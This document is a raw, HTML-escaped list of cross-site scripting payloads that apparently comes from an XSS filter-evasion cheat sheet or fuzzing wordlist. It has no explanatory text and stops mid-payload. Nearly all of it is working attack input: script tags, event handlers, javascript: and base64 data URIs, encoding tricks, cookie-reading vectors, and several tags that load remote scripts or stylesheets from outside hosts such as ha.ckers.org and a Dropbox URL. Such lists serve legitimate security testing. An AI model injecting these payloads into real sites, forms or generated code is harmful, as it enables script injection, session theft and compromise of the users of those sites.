src=&quot;&amp;Tab;javascript:prompt(1)&amp;Tab;&quot;%00&gt;&lt;svg&gt;&lt;style&gt;&#123;font-family&amp;colon;&#x27;&lt;iframe/onload=confirm(1)&gt;&#x27;&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;&lt;sVg&gt;&lt;scRipt %00&gt;alert&amp;lpar;1&amp;rpar; &#123;Opera&#125;&lt;img/src=`%00` onerror=this.onerror=confirm(1)&lt;form&gt;&lt;isindex formaction=&quot;javascript&amp;colon;confirm(1)&quot;&lt;img src=`%00`&amp;NewLine; onerror=alert(1)&amp;NewLine;&lt;script/&amp;Tab; src=&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27; /&amp;Tab;&gt;&lt;/script&gt;&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?&lt;iframe/src=&quot;data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;&lt;script /*%00*/&gt;/*%00*/alert(1)/*%00*/&lt;/script /*%00*/&amp;#34;&amp;#62;&lt;h1/onmouseover=&#x27;\\u0061lert(1)&#x27;&gt;%00&lt;iframe/src=&quot;data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;&quot;&gt;&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&#x27;https://www.google.com/&#x27;)&gt;&lt;/script&lt;svg&gt;&lt;script x:href=&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27; &#123;Opera&#125;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;&lt;form&gt;&lt;a href=&quot;javascript:\\u0061lert&amp;#x28;1&amp;#x29;&quot;&gt;X&lt;/script&gt;&lt;img/*%00/src=&quot;worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;&quot;/%00*/onerror=&#x27;eval(src)&#x27;&gt;&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=&quot;javascript&amp;#58;alert(1)&quot;&amp;#11;&amp;#10;&amp;#09;;&gt;&lt;a href=&quot;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/ahttp://www.google&lt;script .com&gt;alert(document.location)&lt;/script&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;&quot;&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;&quot;&gt;XYZ&lt;/a&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt(&#x27;&amp;#49;&#x27;)&lt;style/onload=prompt&amp;#40;&#x27;&amp;#88;&amp;#83;&amp;#83;&#x27;&amp;#41;&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;&quot;date&quot; onfocus=&quot;alert(1)&quot;&gt;&lt;form&gt;&lt;textarea &amp;#13; onkeyup=&#x27;\\u0061\\u006C\\u0065\\u0072\\u0074&amp;#x28;1&amp;#x29;&#x27;&gt;&lt;script /***/&gt;/***/confirm(&#x27;\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450&#x27;)/***/&lt;/script /***/&lt;iframe srcdoc=&#x27;&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;&#x27;&gt;&lt;a href=&quot;javascript:void(0)&quot; onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;&lt;///style///&gt;&lt;span %2F onmousemove=&#x27;alert&amp;lpar;1&amp;rpar;&#x27;&gt;SPAN&lt;img/src=&#x27;http://i.imgur.com/P8mL8.jpg&#x27; onmouseover=&amp;Tab;prompt(1)&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;&#123;-o-link-source&amp;colon;&#x27;&lt;body/onload=confirm(1)&gt;&#x27;&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver &#123;Firefox &amp; Opera&#125;&lt;marquee onstart=&#x27;javascript:alert&amp;#x28;1&amp;#x29;&#x27;&gt;^__^&lt;div/style=&quot;width:expression(confirm(1))&quot;&gt;X&lt;/div&gt; &#123;IE7&#125;&lt;iframe/%00/ src=javaSCRIPT&amp;colon;alert(1)//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type=&#x27;submit&#x27;&gt;///*iframe/src*/&lt;iframe/src=&quot;&lt;iframe/src=@&quot;/onload=prompt(1) /*iframe/src*/&gt;//|\\\\ &lt;script //|\\\\ src=&#x27;https://dl.dropbox.com/u/13018058/js.js&#x27;&gt; //|\\\\ &lt;/script //|\\\\&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;&#123;src&amp;#x3A;&#x27;&lt;style/onload=this.onload=confirm(1)&gt;&#x27;&lt;/font&gt;/&lt;/style&gt;&lt;a/href=&quot;javascript:&amp;#13; javascript:prompt(1)&quot;&gt;&lt;input type=&quot;X&quot;&gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)&lt;/svg&gt;&#x27;&#x27;&lt;svg&gt;&lt;script &#x27;AQuickBrownFoxJumpsOverTheLazyDog&#x27;&gt;alert&amp;#x28;1&amp;#x29; &#123;Opera&#125;&lt;a href=&quot;javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;&quot;&gt;&lt;button&gt;&lt;div onmouseover=&#x27;alert&amp;lpar;1&amp;rpar;&#x27;&gt;DIV&lt;/div&gt;&lt;iframe style=&quot;xg-p:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot;&gt;&lt;a href=&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;X&lt;/a&gt;&lt;embed src=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&lt;object data=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt;&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&#x27;prompt(1)&#x27;&quot;&gt;&lt;%&lt;!--&#x27;%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&lt;iframe/src \\/\\/onload = prompt(1)&lt;iframe/onreadystatechange=alert(1)&lt;svg/onload=alert(1)&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover=&#x27;alert(1)&#x27;&gt;X&lt;/div&gt;http://www.&lt;script&gt;alert(1)&lt;/script .com&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;&lt;svg&gt;&lt;script ?&gt;alert(1)&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;&lt;img src=`xx:xx`onerror=alert(1)&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click&lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1&lt;a href=&quot;data:text/html;base64_,&lt;svg/onload=\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&quot;&gt;X&lt;/a&lt;iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074(&#x27;\\u0061&#x27;) worksinIE&gt;&lt;script&gt;~&#x27;\\u0061&#x27; ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~&#x27;\\u0061&#x27;)&lt;/script U+&lt;script/src=&quot;data&amp;colon;text%2Fj\\u0061v\\u0061script,\\u0061lert(&#x27;\\u0061&#x27;)&quot;&gt;&lt;/script a=\\u0061 &amp; /=%2F&lt;script/src=data&amp;colon;text/j\\u0061v\\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script&lt;object data=javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script&lt;img src ?itworksonchrome?\\/onerror = alert(1)&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe&lt;script x&gt; alert(1) &lt;/script 1=2&lt;div/onmouseover=&#x27;alert(1)&#x27;&gt; style=&quot;x:&quot;&gt;&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt; &lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;&lt;div style=&quot;xg-p:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt;&quot;&gt;&lt;img src=x onerror=window.open(&#x27;https://www.google.com/&#x27;);&gt;&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;&lt;a href=&quot;data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203&quot;&gt;Click Me&lt;/a&gt;&lt;SCRIPT&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)&lt;/SCRIPT&gt;�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�&gt;&lt;/SCRIPT&gt;�&gt;�&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;IMG ���&gt;&lt;SCRIPT&gt;alert(�XSS�)&lt;/SCRIPT&gt;�&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&lt;IMG SRC=�jav ascript:alert(�XSS�);�&gt;&lt;IMG SRC=�jav&amp;#x09;ascript:alert(�XSS�);�&gt;&lt;&lt;SCRIPT&gt;alert(�XSS�);//&lt;&lt;/SCRIPT&gt;%253cscript%253ealert(1)%253c/script%253e�&gt;&lt;s�%2b�cript&gt;alert(document.cookie)&lt;/script&gt;foo&lt;script&gt;alert(1)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;BODY BACKGROUND=�javascript:alert(�XSS�)�&gt;&lt;BODY ONLOAD=alert(�XSS�)&gt;&lt;INPUT TYPE=�IMAGE� SRC=�javascript:alert(�XSS�);�&gt;&lt;IMG SRC=�javascript:alert(�XSS�)�&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;javascript:alert(&quot;hellox worldss&quot;)&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;img src=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;&lt;&quot;&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;&lt;IFRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/IFRAME&gt;&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&quot; &#x27;&#x27; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT &quot;a=&#x27;&gt;&#x27;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&#x27;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;&lt;&quot;&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;?/SCRIPT&gt;&amp;submit.x=27&amp;submit.y=9&amp;cmd=search&lt;script&gt;alert(&quot;hellox worldss&quot;)&lt;/script&gt;&amp;safe=high&amp;cx=006665157904466893121:su_tzknyxug&amp;cof=FORID:9#510&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;&amp;search=10&amp;q=&#x27;;alert(String.fromCharCode(88,83,83))//\\&#x27;;alert%2?8String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode?(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83)%?29//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83%?2C83))&lt;/SCRIPT&gt;&amp;submit-frmGoogleWeb=Web+Search&lt;h1&gt;&lt;font color=blue&gt;hellox worldss&lt;/h1&gt;&lt;BODY ONLOAD=alert(&#x27;hellox worldss&#x27;)&gt;&lt;input onfocus=write(XSS) autofocus&gt;&lt;input onblur=write(XSS) autofocus&gt;&lt;input autofocus&gt;&lt;body onscroll=alert(XSS)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;form&gt;&lt;button formaction=&quot;javascript:alert(XSS)&quot;&gt;lol&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(XSS)//&quot;&gt;&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=alert(XSS)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(XSS)//&quot;&gt;&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;? foo=&quot;&gt;&lt;x foo=&#x27;?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;&gt;&quot;&gt;&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;alert(123)&lt;/script&gt;&quot;&gt;&lt;div style=&quot;font-family:&#x27;foo&amp;#10;;color:red;&#x27;;&quot;&gt;LOLLOL&lt;style&gt;*&#123;/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;&#125;&lt;/style&gt;&lt;script&gt;(&#123;0:#0=alert/#0#/#0#(0)&#125;)&lt;/script&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;LOL&lt;script&gt;alert(123)&lt;/script&gt;&lt;/svg&gt;&amp;lt;SCRIPT&amp;gt;alert(/XSS/&amp;#46;source)&amp;lt;/SCRIPT&amp;gt;\\\\&quot;;alert(&#x27;XSS&#x27;);//&amp;lt;/TITLE&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(\\&quot;XSS\\&quot;);&amp;lt;/SCRIPT&amp;gt;&amp;lt;INPUT TYPE=\\&quot;IMAGE\\&quot; SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;BODY BACKGROUND=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&amp;gt;&amp;lt;IMG DYNSRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;IMG LOWSRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;BGSOUND SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;BR SIZE=\\&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;\\&quot;&amp;gt;&amp;lt;LAYER SRC=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html\\&quot;&amp;gt;&amp;lt;/LAYER&amp;gt;&amp;lt;LINK REL=\\&quot;stylesheet\\&quot; HREF=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;LINK REL=\\&quot;stylesheet\\&quot; HREF=\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css\\&quot;&amp;gt;&amp;lt;STYLE&amp;gt;@import&#x27;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css&#x27;;&amp;lt;/STYLE&amp;gt;&amp;lt;META HTTP-EQUIV=\\&quot;Link\\&quot; Content=\\&quot;&amp;lt;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;css&amp;gt;; REL=stylesheet\\&quot;&amp;gt;&amp;lt;STYLE&amp;gt;BODY&#123;-moz-binding&amp;#58;url(\\&quot;http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xssmoz&amp;#46;xml#xss\\&quot;)&#125;&amp;lt;/STYLE&amp;gt;&amp;lt;XSS STYLE=\\&quot;behavior&amp;#58; url(xss&amp;#46;htc);\\&quot;&amp;gt;&amp;lt;STYLE&amp;gt;li &#123;list-style-image&amp;#58; url(\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;);&#125;&amp;lt;/STYLE&amp;gt;&amp;lt;UL&amp;gt;&amp;lt;LI&amp;gt;XSS&amp;lt;IMG SRC=&#x27;vbscript&amp;#058;msgbox(\\&quot;XSS\\&quot;)&#x27;&amp;gt;&amp;lt;IMG SRC=\\&quot;mocha&amp;#58;&amp;#91;code&amp;#93;\\&quot;&amp;gt;&amp;lt;IMG SRC=\\&quot;livescript&amp;#058;&amp;#91;code&amp;#93;\\&quot;&amp;gt;�scriptualert(EXSSE)�/scriptu&amp;lt;META HTTP-EQUIV=\\&quot;refresh\\&quot; CONTENT=\\&quot;0;url=javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;META HTTP-EQUIV=\\&quot;refresh\\&quot; CONTENT=\\&quot;0;url=data&amp;#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\&quot;&amp;gt;&amp;lt;META HTTP-EQUIV=\\&quot;refresh\\&quot; CONTENT=\\&quot;0; URL=http&amp;#58;//;URL=javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;lt;IFRAME SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME SRC=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;);\\&quot;&amp;gt;&amp;lt;/FRAMESET&amp;gt;&amp;lt;TABLE BACKGROUND=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;TABLE&amp;gt;&amp;lt;TD BACKGROUND=\\&quot;javascript&amp;#058;alert(&#x27;XSS&#x27;)\\&quot;&amp;gt;&amp;lt;DIV STYLE=\\&quot;background-image&amp;#58; url(javascript&amp;#058;alert(&#x27;XSS&#x27;))\\&quot;&amp;gt;&amp;lt;DIV STYLE=\\&quot;background-image&amp;#58;\\0075\\0072\\006C\\0028&#x27;\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028&amp;#46;1027\\0058&amp;#46;1053\\0053\\0027\\0029&#x27;\\0029\\&quot;&amp;gt;&amp;lt;DIV STYLE=\\&quot;background-image&amp;#58; url(javascript&amp;#058;alert(&#x27;XSS&#x27;))\\&quot;&amp;gt;&amp;lt;DIV STYLE=\\&quot;width&amp;#58; expression(alert(&#x27;XSS&#x27;));\\&quot;&amp;gt;&amp;lt;STYLE&amp;gt;@im\\port&#x27;\\ja\\vasc\\ript&amp;#58;alert(\\&quot;XSS\\&quot;)&#x27;;&amp;lt;/STYLE&amp;gt;&amp;lt;IMG STYLE=\\&quot;xss&amp;#58;expr/*XSS*/ession(alert(&#x27;XSS&#x27;))\\&quot;&amp;gt;&amp;lt;XSS 